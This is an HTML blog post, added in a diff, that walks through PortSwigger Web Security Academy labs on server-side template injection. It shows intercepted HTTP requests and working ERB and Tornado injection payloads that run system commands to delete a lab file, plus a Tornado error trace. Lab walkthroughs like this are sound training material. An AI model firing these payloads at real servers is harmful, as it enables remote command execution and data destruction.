@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <title>Muhammadsaid Alizada</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&display=swap" rel="stylesheet">
+  </head>
+
+<body>
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Server Side Template Injection - Web Sec academy labs</title>
+    <style>
+      :root {
+        --text-color: #333;
+        --accent-color: #2962FF;
+        --background-color: #fff;
+        --card-color: #f8f9fa;
+        --border-color: #e0e0e0;
+        --meta-color: #666;
+      }
+      
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        line-height: 1.6;
+        color: var(--text-color);
+        background-color: var(--background-color);
+        margin: 0;
+        padding: 0;
+      }
+
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 40px 20px;
+      }
+
+      header {
+        margin-bottom: 2.5em;
+      }
+
+      h1 {
+        font-size: 2.2em;
+        margin-bottom: 0.3em;
+        font-weight: 600;
+      }
+
+      .contact-info {
+        margin: 0.8em 0;
+        color: var(--meta-color);
+      }
+
+      .contact-info a {
+        color: var(--accent-color);
+        text-decoration: none;
+      }
+
+      .contact-info a:hover {
+        text-decoration: underline;
+      }
+
+      .contact-info span {
+        margin: 0 8px;
+        color: var(--border-color);
+      }
+
+      nav {
+        margin: 1.8em 0;
+      }
+
+      nav a {
+        margin-right: 20px;
+        text-decoration: none;
+        color: var(--text-color);
+        font-weight: 500;
+        position: relative;
+      }
+
+      nav a:hover {
+        color: var(--accent-color);
+      }
+
+      nav a:after {
+        content: '';
+        position: absolute;
+        width: 0;
+        height: 2px;
+        bottom: -4px;
+        left: 0;
+        background-color: var(--accent-color);
+        transition: width 0.3s ease;
+      }
+
+      nav a:hover:after {
+        width: 100%;
+      }
+
+      .header-divider {
+        border: 0;
+        height: 1px;
+        background: var(--border-color);
+        margin: 1.5em 0;
+      }
+
+      .post-container {
+        background: var(--card-color);
+        border-radius: 8px;
+        padding: 2.5em;
+        margin-bottom: 3em;
+        border: 1px solid var(--border-color);
+      }
+
+      .post-title {
+        margin-top: 0;
+        font-size: 1.8em;
+      }
+
+      .post-meta {
+        color: var(--meta-color);
+        font-size: 0.9em;
+        margin-bottom: 1.5em;
+      }
+
+      .post-divider {
+        border: none;
+        height: 1px;
+        background: var(--border-color);
+        margin: 2em 0;
+      }
+
+      .post-content {
+        line-height: 1.7;
+      }
+
+      .post-content a {
+        color: var(--accent-color);
+        text-decoration: none;
+      }
+
+      .post-content a:hover {
+        text-decoration: underline;
+      }
+
+      .post-content code {
+        font-family: 'Fira Code', monospace;
+        background: rgba(0,0,0,0.05);
+        padding: 0.2em 0.4em;
+        border-radius: 3px;
+        font-size: 0.9em;
+        border: 1px solid rgba(0,0,0,0.1);
+      }
+
+      .post-content pre {
+        background: rgba(0,0,0,0.05);
+        padding: 1em;
+        border-radius: 5px;
+        overflow-x: auto;
+        border: 1px solid rgba(0,0,0,0.1);
+      }
+
+      .post-content pre code {
+        background: none;
+        padding: 0;
+        border: none;
+      }
+
+      .back-link {
+        color: var(--accent-color);
+        text-decoration: none;
+        font-weight: 500;
+        display: inline-block;
+        margin-top: 1em;
+      }
+
+      .back-link:hover {
+        text-decoration: underline;
+      }
+
+      @media (max-width: 768px) {
+        .container {
+          padding: 30px 15px;
+        }
+        
+        .post-container {
+          padding: 1.5em;
+        }
+        
+        nav a {
+          margin-right: 15px;
+        }
+      }
+    </style>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+  <div class="container">
+    <header>
+  <div class="header-name-container">
+    <img src="http://localhost:4321/assets/i.jpeg" alt="Muhammadsaid Alizada" class="profile-photo">
+    <h1>Muhammadsaid Alizada</h1>
+  </div>
+  
+  <div class="contact-info">
+    <a href="mailto:ma8494@nyu.edu">ma8494@nyu.edu</a>
+    <span>|</span>
+    <a href="https://github.com/MSaidAlizada" target="_blank">GitHub</a>
+    <span>|</span>
+    <a href="https://www.linkedin.com/in/muhammadsaid-alizada/" target="_blank">LinkedIn</a>
+  </div>
+  
+  <nav>
+    <a href="http://localhost:4321/">home</a>
+    <a href="http://localhost:4321/posts">posts</a>
+    <a href="http://localhost:4321/notes">notes</a>
+    <a href="http://localhost:4321/assets/CV.pdf">cv</a>
+    <a href="mailto:ma8494@nyu.edu">contact</a>
+  </nav>
+  
+  <hr class="header-divider">
+</header>
+
+<style>
+  .header-name-container {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 0.5em;
+  }
+
+  .profile-photo {
+    width: 80px;
+    height: 80px;
+    border-radius: 4px;
+    object-fit: cover;
+    border: 2px solid var(--border-color);
+  }
+
+</style>
+
+    <div class="post-container">
+      <article class="post">
+        <h1 class="post-title">Server Side Template Injection - Web Sec academy labs</h1>
+        <p class="post-meta">Posted on June 30, 2025</p>
+        
+        <div class="post-content">
+          <p>This post will run through the labs on web sec academy by Portswigger related to Server Side Template Injection.</p>
+
+<p>After finding a potential template injection you will have to identify the template engine since they can have different syntax. Using the below flow chart from Portswigger academy we can figure out the template engine:</p>
+
+<div style="text-align: center;">
+    <img src="http://localhost:4321/assets/ssti/chart.png" alt="flow chart" style="width: 500px;" />
+</div>
+
+<h3 id="lab-basic-server-side-template-injection"><u>Lab: Basic server-side template injection</u></h3>
+<p>For this lab we are told there is a vulnerability due to the unsafe construction of an ERB template. When we try open the first product shown on the catalog we get the message “Unfortunately this product is out of stock” which is shown on our screen. Looking at the burp http history we find a request:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
+Host: 0a4000c304ae989c804a216300b60089.web-security-academy.net
+Cookie: session=rtLpQI4Soenj8wMmnNyU1SbdatX4Y2pC
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a4000c304ae989c804a216300b60089.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+</code></pre></div></div>
+
+<p>Now looking at ERB documentation we can change the request to see if we can execute commands using system().
+By using the request below we can delete the file.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?message=&lt;%25%3d+system('rm+morale.txt')+%25&gt;
+</code></pre></div></div>
+
+<h3 id="lab-basic-server-side-template-injection-code-context"><u>Lab: Basic server-side template injection (code context)</u></h3>
+<p>In this lab instead Tornado as template engine and we have a comment section in posts. After logging in we see we can change our preferred name and when we do this this request is sent:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /my-account/change-blog-post-author-display HTTP/2
+Host: 0adb008104e0d4349d556ea500d40091.web-security-academy.net
+Cookie: session=LtI4PJuu21HxXAzlvMgYZuMR6nYRFEUI
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: https://0adb008104e0d4349d556ea500d40091.web-security-academy.net
+Referer: https://0adb008104e0d4349d556ea500d40091.web-security-academy.net/my-account?id=wiener
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+blog-post-author-display=user.nickname&amp;csrf=QsoccjcYx58Qo1Ad7rGtH14rfAssSKWn
+</code></pre></div></div>
+<p>Looking at this request I see that mabye the blog-post-author-display parameter can be used as a vulnerability to execute some commands since it gets displayed in comments. Using { } in tornado we can insert something and since it is a python template engine to run a command we need to import os and os.system(“some command”). So when we first put this request with these parameters:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog-post-author-display={import+os%3b+os.system('rm+morale.txt')+}
+</code></pre></div></div>
+<p>We get the error:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>No handlers could be found for logger "tornado.application" Traceback (most recent call last): File "&lt;string&gt;", line 15, in &lt;module&gt; File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 317, in __init__ "exec", dont_inherit=True) File "&lt;string&gt;.generated.py", line 5 _tt_tmp = import os; os.system('rm morale.txt') # &lt;string&gt;:1 ^ SyntaxError: invalid syntax
+</code></pre></div></div>
+<p>Now we can see that the code is being inserted into a variable declaration so if we just end that line by assigning the variable to some string and ending the line we can execute our own code so we the parameter:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog-post-author-display={'a'%3b+import+os%3b+os.system('rm+morale.txt')+}
+</code></pre></div></div>
+
+        </div>
+        
+        <hr class="post-divider">
+        
+        <a href="http://localhost:4321/posts" class="back-link">← All Posts</a>
+      </article>
+    </div>
+  </div>
+</body>
+</html>
+</body>
+</html>
